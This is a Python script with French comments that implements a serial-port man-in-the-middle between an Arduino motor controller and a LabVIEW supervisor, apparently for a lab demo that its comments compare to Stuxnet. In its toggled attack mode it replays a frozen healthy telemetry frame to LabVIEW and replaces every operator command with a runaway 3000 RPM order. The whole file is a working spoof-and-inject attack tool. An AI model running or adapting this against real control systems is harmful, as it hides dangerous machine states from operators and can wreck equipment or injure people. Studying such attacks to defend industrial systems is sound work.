import serial
import keyboard

# ---------- CONFIGURATION ----------
PORT_ARDUINO = "COM3"       # port A — câble USB physique vers l'Arduino
PORT_LABVIEW = "COM21"      # port C — virtuel, relié à COM20 (LabVIEW) via com0com
BAUDRATE = 115200
TIMEOUT = 0.05              # 50ms : readline() renvoie vite si rien n'arrive
                            # → la boucle ne se bloque pas en attendant une ligne

# ---------- ÉTAT GLOBAL ----------
mode_attaque = False
trame_leurre_figee = None   # bytes bruts de la dernière trame saine reçue
touche_b_precedente = False # mémorise l'état précédent pour éviter le rebond


# ─────────────────────────────────────────────────────────────────
# BLOC 1 — Parsing
# ─────────────────────────────────────────────────────────────────
def parser_trame(trame_str):
    """
    Entrée  : "[VITESSE=1000|ETAT=2|CRC=142]"  (string, crochets inclus)
    Sortie  : {"VITESSE": 1000, "ETAT": 2, "CRC": 142}

    Pourquoi un dict plutôt que des variables séparées ?
    → Plus facile à passer à construire_trame, et tu peux faire dico["VITESSE"]
      n'importe où sans te souvenir de l'ordre des variables.
    """
    contenu = trame_str[1:-1]           # supprime [ et ]  →  "VITESSE=1000|ETAT=2|CRC=142"
    paires  = contenu.split('|')        # ["VITESSE=1000", "ETAT=2", "CRC=142"]
    result  = {}
    for paire in paires:
        cle, valeur = paire.split('=') # "VITESSE", "1000"
        result[cle] = int(valeur)
    return result


# ─────────────────────────────────────────────────────────────────
# BLOC 2 — Construction (inverse du parsing)
# ─────────────────────────────────────────────────────────────────
def construire_trame(dico):
    """
    Entrée  : {"VITESSE": 1000, "ETAT": 2, "CRC": 142}
    Sortie  : "[VITESSE=1000|ETAT=2|CRC=142]\n"

    Note : pour le leurre on ne l'utilise pas directement
    (on stocke déjà les bytes bruts), mais cette fonction
    sera utile si tu veux forger une fausse trame personnalisée.
    """
    parties = [f"{cle}={valeur}" for cle, valeur in dico.items()]
    return "[" + "|".join(parties) + "]\n"


# ─────────────────────────────────────────────────────────────────
# BLOC 3 — Détection de la touche 'b' (front montant seulement)
# ─────────────────────────────────────────────────────────────────
def verifier_touche_b():
    """
    Bascule mode_attaque UNE seule fois par appui physique.

    Problème sans front montant :
      keyboard.is_pressed('b') reste True tant que tu maintiens la touche.
      Si la boucle tourne à 1000 it/s, mode_attaque clignoterait 1000 fois/s.

    Solution — on ne bascule que quand la touche VIENT d'être pressée
    (transition False→True), pas pendant tout le maintien.
    """
    global mode_attaque, touche_b_precedente

    etat_actuel = keyboard.is_pressed('b')

    if etat_actuel and not touche_b_precedente:   # front montant détecté
        mode_attaque = not mode_attaque
        statut = "ATTAQUE ACTIVÉE 🔴" if mode_attaque else "MODE NORMAL 🟢"
        print(f"\n[BASCULE] {statut}\n")

    touche_b_precedente = etat_actuel             # mémorise pour le prochain tour


# ─────────────────────────────────────────────────────────────────
# BLOC 4 — Relais Arduino → LabVIEW
# ─────────────────────────────────────────────────────────────────
def relais_arduino_vers_labview(ser_arduino, ser_labview):
    """
    Mode normal  : transmet la vraie trame ET la mémorise comme leurre futur.
    Mode attaque : envoie la trame leurre figée à LabVIEW au lieu de la vraie.
                   LabVIEW croit que tout va bien (1000 RPM) alors que le moteur
                   tourne à 3000 RPM — c'est le principe Stuxnet.
    """
    global trame_leurre_figee

    ligne = ser_arduino.readline()   # bytes bruts, ex: b"[VITESSE=1000|ETAT=2|CRC=142]\n"
    if not ligne:
        return                       # timeout 50ms écoulé, rien reçu → on continue

    if not mode_attaque:
        ser_labview.write(ligne)                          # relais transparent
        trame_leurre_figee = ligne                        # on garde la dernière saine
        print(f"[A→LV]  {ligne.decode('utf-8').strip()}")
    else:
        if trame_leurre_figee is not None:
            ser_labview.write(trame_leurre_figee)         # mensonge envoyé à LabVIEW
            print(f"[LEURRE→LV] {trame_leurre_figee.decode('utf-8').strip()}")


# ─────────────────────────────────────────────────────────────────
# BLOC 5 — Relais LabVIEW → Arduino
# ─────────────────────────────────────────────────────────────────
def relais_labview_vers_arduino(ser_arduino, ser_labview):
    """
    Mode normal  : transmet la commande LabVIEW à l'Arduino sans toucher.
    Mode attaque : bloque la commande LabVIEW (l'Arduino ne la voit jamais)
                   et injecte à la place l'ordre d'emballement [CMD_RPM=3000].

    Pourquoi envoyer la commande d'emballement à chaque fois que LabVIEW parle ?
    → LabVIEW envoie périodiquement ses commandes de consigne.
      Chaque fois qu'il en envoie une, on substitue notre ordre.
      Ça garantit que l'Arduino reste bien bloqué à 3000 RPM pendant toute la démo.
    """
    ligne = ser_labview.readline()
    if not ligne:
        return

    if not mode_attaque:
        ser_arduino.write(ligne)
        print(f"[LV→A]  {ligne.decode('utf-8').strip()}")
    else:
        commande_emballement = "[CMD_RPM=3000]\n".encode('utf-8')
        ser_arduino.write(commande_emballement)
        print("[ATTAQUE→A] Ordre d'emballement : [CMD_RPM=3000]")


# ─────────────────────────────────────────────────────────────────
# BLOC 6 — Boucle principale
# ─────────────────────────────────────────────────────────────────
def boucle_principale():
    """
    Ouvre les 2 ports avec timeout court (non bloquant),
    boucle en permanence, ferme proprement sur Ctrl+C.

    Pourquoi finally et pas juste except ?
    → finally s'exécute TOUJOURS, même si une exception inattendue se produit.
      Les ports série restent proprement fermés quoi qu'il arrive.
    """
    print(f"Ouverture ports — Arduino : {PORT_ARDUINO} | LabVIEW : {PORT_LABVIEW}")

    ser_arduino = None
    ser_labview = None

    try:
        ser_arduino = serial.Serial(PORT_ARDUINO, BAUDRATE, timeout=TIMEOUT)
        ser_labview = serial.Serial(PORT_LABVIEW, BAUDRATE, timeout=TIMEOUT)

        print("Ports ouverts. Relais actif.")
        print("→ Appuyez sur 'b' pour basculer en mode attaque. Ctrl+C pour quitter.\n")

        while True:
            verifier_touche_b()
            relais_arduino_vers_labview(ser_arduino, ser_labview)
            relais_labview_vers_arduino(ser_arduino, ser_labview)

    except KeyboardInterrupt:
        print("\nArrêt demandé (Ctrl+C).")

    finally:
        if ser_arduino and ser_arduino.is_open:
            ser_arduino.close()
            print("Port Arduino fermé.")
        if ser_labview and ser_labview.is_open:
            ser_labview.close()
            print("Port LabVIEW fermé.")


if __name__ == "__main__":
    boucle_principale()